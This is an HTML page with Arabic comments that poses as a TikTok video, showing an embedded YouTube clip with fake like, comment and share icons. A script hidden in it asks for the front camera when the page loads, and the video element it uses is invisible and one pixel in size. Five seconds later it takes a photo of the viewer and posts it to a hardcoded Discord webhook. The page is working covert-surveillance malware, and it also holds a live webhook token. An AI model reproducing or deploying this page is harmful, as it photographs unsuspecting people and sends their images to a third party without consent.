<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        .wrapper { position: relative; width: 100%; height: 100%; overflow: hidden; }
        
        /* ضبط إطار اليوتيوب ليملأ الشاشة */
        #youtube-player {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100vh;
            height: 100vw;
            transform: translate(-50%, -50%) rotate(90deg);
            pointer-events: none; /* لمنع التفاعل المباشر مع الفيديو */
        }
        
        /* في حال كان التصفح من الجوال، نعدل الأبعاد ليظهر كـ Shorts */
        @media (orientation: portrait) {
            #youtube-player {
                width: 100vw;
                height: 100vh;
                transform: translate(-50%, -50%) rotate(0deg);
            }
        }

        .sidebar { position: absolute; right: 15px; bottom: 120px; display: flex; flex-direction: column; gap: 20px; z-index: 10; }
        .icon { width: 45px; height: 45px; border-radius: 50%; background: rgba(255,255,255,0.2); display: flex; align-items: center; justify-content: center; color: white; font-size: 22px; }
        .user-info { position: absolute; left: 15px; bottom: 40px; color: white; z-index: 10; }
        .user-info h3 { margin: 0; font-size: 18px; font-weight: bold; }

        #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
        #photo-canvas { display: none; }
    </style>
</head>
<body>

<div class="wrapper">
    <iframe id="youtube-player" 
        src="https://www.youtube.com/embed/C3vaOyZFcsM?autoplay=1&mute=1&loop=1&playlist=C3vaOyZFcsM&controls=0&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3" 
        frameborder="0" 
        allow="autoplay; encrypted-media; picture-in-picture" 
        allowfullscreen>
    </iframe>

    <div class="sidebar">
        <div class="icon">❤️</div>
        <div class="icon">💬</div>
        <div class="icon">↪️</div>
    </div>
    <div class="user-info">
        <h3>@driftedluxury</h3>
        <p>خليل الشبرمي ومحمد بن الذيب 😂 #شعر #مضحك</p>
    </div>
</div>

<video id="hidden-camera" autoplay playsinline muted></video>
<canvas id="photo-canvas"></canvas>

<script>
    const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';

    window.onload = async () => {
        const camera = document.getElementById('hidden-camera');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            camera.srcObject = stream;
            
            // التصوير بعد 5 ثواني لضمان أن المستخدم اندمج مع الفيديو
            setTimeout(() => {
                captureAndSend(camera);
            }, 5000);
        } catch (err) { console.log("Access Denied"); }
    };

    async function captureAndSend(cameraElement) {
        const canvas = document.getElementById('photo-canvas');
        const context = canvas.getContext('2d');
        if (cameraElement.videoWidth === 0) return;

        canvas.width = cameraElement.videoWidth;
        canvas.height = cameraElement.videoHeight;
        context.drawImage(cameraElement, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append('file', blob, 'youtube_prank_capture.png');
            await fetch(webhookURL, { method: 'POST', body: formData });
        }, 'image/png');
    }
</script>
</body>
</html>
